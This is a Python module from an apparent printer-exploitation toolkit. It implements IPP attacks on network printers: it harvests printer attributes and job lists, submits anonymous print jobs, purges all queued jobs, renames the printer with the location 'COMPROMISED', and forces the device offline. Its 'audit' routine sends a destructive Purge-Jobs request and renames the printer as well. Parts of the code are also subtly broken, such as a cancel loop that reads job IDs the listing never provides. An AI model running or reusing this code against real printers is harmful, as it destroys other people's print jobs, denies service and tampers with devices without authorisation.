#!/usr/bin/env python3
"""
PrinterXPL-Forge — IPP Attack Module
===================================
Internet Printing Protocol (RFC 2910/2911/8011) attack operations.

Targets printers that do NOT support PJL/PS/PCL (inkjets, ESC/P, PWGRaster)
but DO expose IPP/port 631. This is the primary attack surface for modern
EPSON, Canon, HP inkjet, and AirPrint-enabled printers.

Attack categories:
  1. Information disclosure (printer attrs, jobs, queues)
  2. Anonymous job submission (no authentication required)
  3. Job cancellation / queue purge (DoS)
  4. Printer attribute manipulation (name, location, description)
  5. SSRF via IPP fetch-document / print-by-reference (see ssrf_pivot.py)
  6. Credential brute-force on IPP with HTTP digest
  7. ESC/P-R, PWGRaster, PDF raw job injection
"""

# Author    : Andre Henrique (@mrhenrike)
# GitHub    : https://github.com/mrhenrike
# LinkedIn  : https://linkedin.com/in/mrhenrike
# X/Twitter : https://x.com/mrhenrike


import logging
import re
import socket
import struct
import time
from typing import Dict, List, Optional, Tuple

import requests
import urllib3

urllib3.disable_warnings()

_log = logging.getLogger(__name__)

# ── IPP helpers ───────────────────────────────────────────────────────────────

_REQ_ID = 0


def _next_req_id() -> int:
    global _REQ_ID
    _REQ_ID += 1
    return _REQ_ID


def _attr(tag: int, name: str, value: str | bytes, value_tag: int = None) -> bytes:
    """Build a raw IPP attribute (name-value pair)."""
    name_b = name.encode('utf-8') if isinstance(name, str) else name
    if isinstance(value, str):
        value_b = value.encode('utf-8')
        vtag    = value_tag or 0x44
    elif isinstance(value, int):
        value_b = struct.pack('>i', value)
        vtag    = value_tag or 0x21
    else:
        value_b = value
        vtag    = value_tag or 0x44
    return (bytes([vtag]) +
            struct.pack('>H', len(name_b)) + name_b +
            struct.pack('>H', len(value_b)) + value_b)


def _build_request(op: int, printer_uri: str, attrs: list[bytes] = None) -> bytes:
    req_id = _next_req_id()
    body   = b'\x01\x01'                     # IPP version 1.1
    body  += struct.pack('>H', op)            # operation
    body  += struct.pack('>I', req_id)        # request-id
    body  += b'\x01'                          # operation-attributes-tag
    body  += _attr(0x47, 'attributes-charset',          'utf-8')
    body  += _attr(0x48, 'attributes-natural-language', 'en')
    body  += _attr(0x45, 'printer-uri',                 printer_uri)
    for a in (attrs or []):
        body += a
    body  += b'\x03'                          # end-of-attributes
    return body


def _post_ipp(
    host: str, port: int, path: str, body: bytes,
    scheme: str = 'https', timeout: float = 10,
) -> bytes | None:
    """POST an IPP request and return raw bytes, or None on error."""
    url = f"{scheme}://{host}:{port}{path}"
    try:
        r = requests.post(
            url, data=body,
            headers={'Content-Type': 'application/ipp',
                     'Content-Length': str(len(body))},
            timeout=timeout, verify=False,
        )
        if r.status_code in (200, 400):  # 400 = IPP error, still valid IPP response
            return r.content
    except Exception as exc:
        _log.debug("IPP POST %s failed: %s", url, exc)
    return None


def _decode_text_attrs(raw: bytes) -> dict[str, str]:
    """Extract printable text attributes from raw IPP response bytes."""
    text = raw.decode('latin-1', errors='replace')
    attrs = {}
    for name in ['printer-make-and-model', 'printer-name', 'printer-info',
                 'printer-location', 'printer-device-id', 'printer-uuid',
                 'printer-firmware-version', 'printer-dns-sd-name',
                 'printer-state-reasons', 'printer-more-info',
                 'printer-supply-info-uri', 'document-format-supported',
                 'queued-job-count', 'printer-up-time', 'printer-state',
                 'uri-authentication-supported']:
        idx = text.find(name)
        if idx >= 0:
            chunk = text[idx:idx+200]
            printable = ''.join(c if 32 <= ord(c) < 127 else '·' for c in chunk)
            attrs[name] = printable.split('·', 2)[-1].strip()[:120]
    return attrs


# ── IPP endpoint discovery ────────────────────────────────────────────────────

def discover_endpoints(
    host: str, timeout: float = 5,
) -> list[dict]:
    """
    Probe common IPP endpoints and return a list of responsive ones.

    Returns list of dicts: {scheme, port, path, auth, version}.
    """
    candidates = [
        ('https', 631, '/ipp/print'),
        ('https', 631, '/ipp/'),
        ('https', 443, '/ipp/print'),
        ('http',  631, '/ipp/print'),
        ('http',  631, '/ipp/'),
        ('http',   80, '/ipp/print'),
    ]
    found = []
    for scheme, port, path in candidates:
        printer_uri = f"ipp://{host}{path}"
        body = _build_request(0x000B, printer_uri,
                              [_attr(0x44, 'requested-attributes', 'printer-state')])
        resp = _post_ipp(host, port, path, body, scheme=scheme, timeout=timeout)
        if resp and len(resp) > 8:
            auth_info = 'unknown'
            text = resp.decode('latin-1', errors='replace')
            if 'uri-authentication-supported' in text:
                m = re.search(r'uri-authentication-supported(.{0,50})', text)
                if m:
                    chunk = ''.join(c if 32 <= ord(c) < 127 else '|' for c in m.group(1))
                    if 'none' in chunk.lower():
                        auth_info = 'none (anonymous OK)'
                    elif 'basic' in chunk.lower():
                        auth_info = 'HTTP Basic'
                    elif 'digest' in chunk.lower():
                        auth_info = 'HTTP Digest'
                    elif 'tls' in chunk.lower():
                        auth_info = 'TLS client cert'
            found.append({
                'scheme': scheme, 'port': port, 'path': path,
                'auth': auth_info, 'version': f"{resp[0]}.{resp[1]}",
                'uri': f"{scheme}://{host}:{port}{path}",
            })
            break  # use first working endpoint
    return found


# ── 1. Information disclosure ─────────────────────────────────────────────────

def get_printer_info(
    host: str, port: int = 631, path: str = '/ipp/print',
    scheme: str = 'https', timeout: float = 10,
) -> dict[str, str]:
    """
    Retrieve all printer attributes via IPP Get-Printer-Attributes (op 0x000B).

    No authentication required on most consumer printers.
    Returns a dict of attribute name → decoded value.
    """
    printer_uri = f"ipp://{host}{path}"
    body = _build_request(0x000B, printer_uri,
                          [_attr(0x44, 'requested-attributes', 'all')])
    resp = _post_ipp(host, port, path, body, scheme=scheme, timeout=timeout)
    if not resp:
        return {}
    attrs = _decode_text_attrs(resp)
    attrs['_raw_size'] = str(len(resp))
    return attrs


def list_jobs(
    host: str, port: int = 631, path: str = '/ipp/print',
    scheme: str = 'https', which: str = 'all', timeout: float = 10,
) -> list[dict]:
    """
    List print jobs via IPP Get-Jobs (op 0x000A).

    Args:
        which: 'all', 'completed', 'not-completed'

    Returns list of job dicts.
    """
    printer_uri = f"ipp://{host}{path}"
    attrs = [
        _attr(0x44, 'requested-attributes', 'all'),
        _attr(0x44, 'which-jobs', which),
        _attr(0x21, 'limit', 50, value_tag=0x21),
    ]
    body = _build_request(0x000A, printer_uri, attrs)
    resp = _post_ipp(host, port, path, body, scheme=scheme, timeout=timeout)
    if not resp:
        return []

    text = resp.decode('latin-1', errors='replace')
    jobs = []
    for m in re.finditer(r'job-name.{0,50}', text):
        chunk = ''.join(c if 32 <= ord(c) < 127 else '|' for c in m.group(0))
        jobs.append({'raw': chunk[:100]})
    return jobs


# ── 2. Anonymous job submission ───────────────────────────────────────────────

def _make_raster_page(width: int = 595, height: int = 842) -> bytes:
    """
    Generate a minimal 1-bit PWG Raster page (blank white).

    PWG Raster format: https://ftp.pwg.org/pub/pwg/candidates/cs-pwgraster10-20120130.pdf
    """
    # PWG Raster header
    sync   = b'RaS2'
    # Page header (ints are big-endian 4-bytes)
    def i4(n): return struct.pack('>I', n)
    # 256-byte page header
    phdr  = b'PwgRaster\x00'                # ColorSpace + Magic
    phdr += b'\x00' * (64 - len(phdr))      # padding
    phdr += i4(1)                            # HWResolutionX
    phdr += i4(1)                            # HWResolutionY
    phdr += i4(0)                            # ImagingBoundingBoxLeft
    phdr += i4(0)                            # ImagingBoundingBoxBottom
    phdr += i4(width)                        # ImagingBoundingBoxRight
    phdr += i4(height)                       # ImagingBoundingBoxTop
    phdr  = phdr[:256].ljust(256, b'\x00')
    # Pixel data: width pixels per line, height lines, 1-bit = all white
    stride   = (width + 7) // 8             # bytes per line
    line     = b'\xff' * stride             # all white
    pixels   = line * height
    return sync + phdr + pixels


def _make_escpr_job(text: str = 'PrinterXPL-Forge') -> bytes:
    """
    Build a minimal ESC/P-R initialization sequence for EPSON inkjet printers.

    ESC/P-R is the EPSON proprietary raster language. This sends an empty
    page with a configurable document title embedded in the escape header.
    """
    esc = b'\x1b'
    init = (
        esc + b'@'                           # ESC @ — initialize printer
        + esc + b'(G\x01\x00\x01'           # Select graphics mode
        + esc + b'(R\x08\x00\x00'           # Remote mode — job start
        + text.encode('ascii', 'replace')[:32]
        + esc + b'(K\x02\x00\x00\x00'      # Set color space
        + esc + b'(S\x08\x00'               # Set page size (A4)
        + struct.pack('<IIH', 595, 842, 0)
        + b'\x0c'                            # Form feed (page eject)
        + esc + b'(R\x08\x00\x01' + b'\x00' * 7  # Remote mode — job end
    )
    return init


def submit_job(
    host:     str,
    port:     int    = 631,
    path:     str    = '/ipp/print',
    scheme:   str    = 'https',
    data:     bytes  = None,
    doc_fmt:  str    = 'image/pwg-raster',
    job_name: str    = 'test-job',
    timeout:  float  = 15,
    dry_run:  bool   = True,
) -> dict:
    """
    Submit an anonymous IPP print job.

    By default dry_run=True (validates that anonymous submission is accepted
    without actually sending the full payload).

    Args:
        data:    Raw print data. If None, a blank PWG-Raster page is used.
        doc_fmt: MIME type of the data (image/pwg-raster, image/urf,
                 application/vnd.epson.escpr, application/pdf, etc.)
        dry_run: If True, send only the Create-Job request and validate
                 that the server accepts it without credentials.

    Returns:
        dict with keys: accepted, job_id, status_code, auth_required, message.
    """
    printer_uri = f"ipp://{host}{path}"
    result = {
        'accepted': False, 'job_id': None,
        'status_code': None, 'auth_required': False, 'message': '',
    }

    # Step 1: Create-Job (op 0x0005) — test anonymous acceptance
    attrs = [
        _attr(0x42, 'job-name', job_name, value_tag=0x42),
        _attr(0x44, 'job-priority', '', value_tag=0x21),
    ]
    body = _build_request(0x0005, printer_uri, attrs)
    resp = _post_ipp(host, port, path, body, scheme=scheme, timeout=timeout)
    if not resp or len(resp) < 8:
        result['message'] = 'No response to Create-Job'
        return result

    status = struct.unpack('>H', resp[2:4])[0]
    result['status_code'] = status

    if status in (0x0401, 0x0403):
        result['auth_required'] = True
        result['message'] = 'Authentication required (client-error-forbidden)'
        return result
    if status & 0x0400:
        result['message'] = f'IPP error: 0x{status:04x}'
        return result

    # Extract job-id from response
    text = resp.decode('latin-1', errors='replace')
    m = re.search(r'job-id.(.{1,8})', text)
    if m:
        # job-id is a 4-byte integer after the attribute name
        chunk = resp[resp.find(b'job-id') + 6: resp.find(b'job-id') + 20]
        if len(chunk) >= 6:
            try:
                result['job_id'] = struct.unpack('>i', chunk[2:6])[0]
            except Exception:
                result['job_id'] = '?'

    result['accepted'] = True
    result['message']  = (
        f"Create-Job accepted (status=0x{status:04x}, job_id={result['job_id']})"
    )

    if dry_run:
        # Step 2 (dry run): Cancel the job immediately to not waste paper
        if result['job_id'] and isinstance(result['job_id'], int):
            _cancel_job(host, port, path, scheme, result['job_id'], printer_uri, timeout)
        result['message'] += ' [dry-run: job cancelled]'
        return result

    # Step 2 (full): Send-Document (op 0x0006)
    if data is None:
        data = _make_raster_page()

    send_attrs = [
        _attr(0x45, 'printer-uri',       printer_uri),
        _attr(0x21, 'job-id',            result['job_id'], value_tag=0x21) if isinstance(result['job_id'], int) else b'',
        _attr(0x44, 'document-format',   doc_fmt),
        _attr(0x42, 'document-name',     job_name, value_tag=0x42),
        _attr(0x22, 'last-document',     b'\x01', value_tag=0x22),
    ]

    req_id = _next_req_id()
    send_body  = b'\x01\x01'
    send_body += struct.pack('>H', 0x0006)
    send_body += struct.pack('>I', req_id)
    send_body += b'\x01'
    for a in send_attrs:
        if a:
            send_body += a
    send_body += b'\x03'
    send_body += data

    resp2 = _post_ipp(host, port, path, send_body, scheme=scheme, timeout=timeout)
    if resp2:
        s2 = struct.unpack('>H', resp2[2:4])[0]
        result['message'] += f' | Send-Document status=0x{s2:04x}'
    return result


# ── 3. Job cancellation / queue purge ─────────────────────────────────────────

def _cancel_job(
    host: str, port: int, path: str, scheme: str,
    job_id: int, printer_uri: str, timeout: float,
) -> bool:
    """Cancel a specific job by ID."""
    attrs = [_attr(0x21, 'job-id', job_id, value_tag=0x21)]
    body  = _build_request(0x0008, printer_uri, attrs)
    resp  = _post_ipp(host, port, path, body, scheme=scheme, timeout=timeout)
    if resp:
        status = struct.unpack('>H', resp[2:4])[0]
        return status == 0x0000
    return False


def purge_all_jobs(
    host:   str,
    port:   int   = 631,
    path:   str   = '/ipp/print',
    scheme: str   = 'https',
    timeout:float = 10,
) -> dict:
    """
    Send IPP Purge-Jobs (op 0x0012) to clear all queued/held jobs.

    This is a DoS vector — all pending print jobs are lost.
    Returns dict with status and number of jobs cancelled.
    """
    printer_uri = f"ipp://{host}{path}"
    body = _build_request(0x0012, printer_uri)
    resp = _post_ipp(host, port, path, body, scheme=scheme, timeout=timeout)
    if not resp:
        return {'success': False, 'message': 'No response'}
    status = struct.unpack('>H', resp[2:4])[0]
    return {
        'success':     status == 0x0000,
        'status_code': f'0x{status:04x}',
        'message':     'Queue purged' if status == 0x0000 else f'Error 0x{status:04x}',
    }


def cancel_all_active(
    host: str, port: int = 631, path: str = '/ipp/print',
    scheme: str = 'https', timeout: float = 10,
) -> list[int]:
    """
    List active jobs and cancel each one (fallback for printers without Purge-Jobs).

    Returns list of cancelled job IDs.
    """
    jobs      = list_jobs(host, port, path, scheme, 'not-completed', timeout)
    cancelled = []
    printer_uri = f"ipp://{host}{path}"
    for job in jobs:
        jid = job.get('id')
        if jid and _cancel_job(host, port, path, scheme, jid, printer_uri, timeout):
            cancelled.append(jid)
    return cancelled


# ── 4. Printer attribute manipulation ────────────────────────────────────────

def set_printer_name(
    host:    str,
    name:    str,
    port:    int   = 631,
    path:    str   = '/ipp/print',
    scheme:  str   = 'https',
    timeout: float = 10,
) -> bool:
    """
    Attempt to rename the printer via CUPS Set-Printer-Attributes.

    Only works if the printer has no authentication or uses CUPS without auth.
    On success, the printer's bonjour/IPP name changes network-wide.
    """
    printer_uri = f"ipp://{host}{path}"
    attrs = [
        _attr(0x42, 'printer-name',     name,  value_tag=0x42),
        _attr(0x42, 'printer-info',     name,  value_tag=0x42),
        _attr(0x42, 'printer-location', 'COMPROMISED', value_tag=0x42),
    ]
    body = _build_request(0x0022, printer_uri, attrs)
    resp = _post_ipp(host, port, path, body, scheme=scheme, timeout=timeout)
    if resp:
        status = struct.unpack('>H', resp[2:4])[0]
        return status == 0x0000
    return False


def set_printer_sleep(
    host: str, port: int = 631, path: str = '/ipp/print',
    scheme: str = 'https', timeout: float = 10,
) -> bool:
    """Send Deactivate-Printer (op 0x001A) to force the printer offline."""
    printer_uri = f"ipp://{host}{path}"
    body = _build_request(0x001A, printer_uri)
    resp = _post_ipp(host, port, path, body, scheme=scheme, timeout=timeout)
    if resp:
        return struct.unpack('>H', resp[2:4])[0] == 0x0000
    return False


# ── 5. Identify / flash attack (IPP 2.0) ─────────────────────────────────────

def identify_printer(
    host: str, port: int = 631, path: str = '/ipp/print',
    scheme: str = 'https', timeout: float = 10,
    action: str = 'flash',
) -> bool:
    """
    Send IPP Identify-Printer (op 0x003C, IPP v2.0) to flash the printer display/LED.

    Can be used to physically locate/distract a printer during a pentest.
    Supported actions: 'flash', 'sound', 'display'.
    """
    printer_uri = f"ipp://{host}{path}"
    attrs = [_attr(0x44, 'identify-actions', action)]
    body  = _build_request(0x003C, printer_uri, attrs)
    resp  = _post_ipp(host, port, path, body, scheme=scheme, timeout=timeout)
    if resp:
        return struct.unpack('>H', resp[2:4])[0] == 0x0000
    return False


# ── 6. Full IPP audit ─────────────────────────────────────────────────────────

def audit(
    host:    str,
    timeout: float = 10,
    verbose: bool  = True,
) -> dict:
    """
    Run a comprehensive IPP security audit on *host*.

    Tests: endpoint discovery, anonymous job acceptance, queue listing,
    job cancellation (dry), printer renaming (dry), Purge-Jobs capability.

    Returns a structured dict with findings.
    """
    results = {
        'host':          host,
        'endpoints':     [],
        'printer_info':  {},
        'jobs':          [],
        'anon_print':    None,
        'can_purge':     None,
        'can_rename':    None,
        'can_sleep':     None,
        'can_identify':  None,
        'risk':          [],
    }

    # Discover endpoints
    eps = discover_endpoints(host, timeout)
    results['endpoints'] = eps
    if not eps:
        if verbose:
            print("  [IPP] No responsive IPP endpoint found")
        return results

    ep = eps[0]
    port, path, scheme = ep['port'], ep['path'], ep['scheme']

    if verbose:
        print(f"  [IPP] Endpoint: {ep['uri']}  auth={ep['auth']}")

    # Printer info
    info = get_printer_info(host, port, path, scheme, timeout)
    results['printer_info'] = info
    if verbose and info:
        for k, v in list(info.items())[:6]:
            print(f"  [IPP]   {k}: {v[:60]}")

    # List jobs
    jobs = list_jobs(host, port, path, scheme, 'all', timeout)
    results['jobs'] = jobs
    if verbose:
        print(f"  [IPP] Queued jobs: {len(jobs)}")

    # Anonymous job submission (dry run)
    job_res = submit_job(host, port, path, scheme,
                         doc_fmt='image/pwg-raster', job_name='pentest-audit',
                         dry_run=True, timeout=timeout)
    results['anon_print'] = job_res
    if job_res['accepted']:
        results['risk'].append('ANONYMOUS_PRINT_ACCEPTED')
        if verbose:
            print(f"  [IPP] \033[1;31m[VULN]\033[0m Anonymous job accepted! {job_res['message']}")
    elif job_res['auth_required']:
        if verbose:
            print("  [IPP] Auth required — anonymous print blocked")
    else:
        if verbose:
            print(f"  [IPP] Job submit: {job_res['message']}")

    # Purge-Jobs
    purge = purge_all_jobs(host, port, path, scheme, timeout)
    results['can_purge'] = purge['success']
    if purge['success']:
        results['risk'].append('CAN_PURGE_QUEUE')
        if verbose:
            print("  [IPP] \033[1;31m[VULN]\033[0m Purge-Jobs accepted (DoS vector)")

    # Rename (attribute manipulation)
    can_rename = set_printer_name(host, '_test_rename_', port, path, scheme, timeout)
    results['can_rename'] = can_rename
    if can_rename:
        results['risk'].append('CAN_RENAME_PRINTER')
        # Restore original name
        orig_name = info.get('printer-name', 'Printer')[:50].strip('·').strip()
        set_printer_name(host, orig_name or 'Printer', port, path, scheme, timeout)
        if verbose:
            print("  [IPP] \033[1;31m[VULN]\033[0m Printer rename accepted (no auth)")

    # Identify (flash)
    can_id = identify_printer(host, port, path, scheme, timeout)
    results['can_identify'] = can_id
    if verbose and can_id:
        print("  [IPP] Identify-Printer (flash) accepted")

    return results
